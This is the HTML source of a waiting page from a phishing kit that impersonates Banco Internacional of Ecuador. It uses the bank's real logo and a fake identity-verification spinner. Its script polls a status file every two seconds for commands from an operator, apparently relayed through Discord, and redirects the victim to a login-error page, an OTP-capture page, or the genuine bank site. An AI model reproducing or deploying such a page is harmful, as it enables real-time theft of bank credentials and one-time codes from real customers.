<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Banco Internacional – Verificando</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body{ min-height:100dvh; background: linear-gradient(160deg, #f59a05 0%, #e08800 60%, #c97500 100%); font-family:sans-serif; display:flex; justify-content:center; align-items:center; color:#fff; }
  .card{ background:rgba(255,255,255,0.12); backdrop-filter:blur(14px); border-radius:24px; padding:40px; width:100%; max-width:380px; text-align:center; border:1px solid rgba(255,255,255,0.25); }
  .spinner{ width:60px; height:60px; border:6px solid rgba(255,255,255,0.2); border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
  @keyframes spin{ to{ transform:rotate(360deg); } }
</style>
</head>
<body>
<div class="card">
  <img src="https://www.bancointernacional.com.ec/wp-content/uploads/2020/11/cropped-logo-banco-internacional.webp" width="160" alt="Logo">
  <div class="spinner"></div>
  <div style="font-weight:600; font-size:1.2rem;">Verificando su identidad</div>
  <p style="opacity:0.8; font-size:0.9rem; margin-top:10px;">Estamos validando su información de forma segura.<br>No cierre esta ventana.</p>
</div>

<script>
  async function chequearOrden() {
    try {
      const res = await fetch('estado.txt?v=' + Math.random());
      const orden = (await res.text()).trim();
      
      if (orden === "error_login") {
        window.location.href = "index.html?status=error";
      } else if (orden === "pedir_otp") {
        window.location.href = "codes.html";
      } else if (orden === "finalizar") {
        window.location.href = "https://www.bancointernacional.com.ec/";
      }
    } catch (e) {}
  }
  // Revisar cada 2 segundos la orden del administrador en Discord
  setInterval(chequearOrden, 2000);
</script>
</body>
</html>
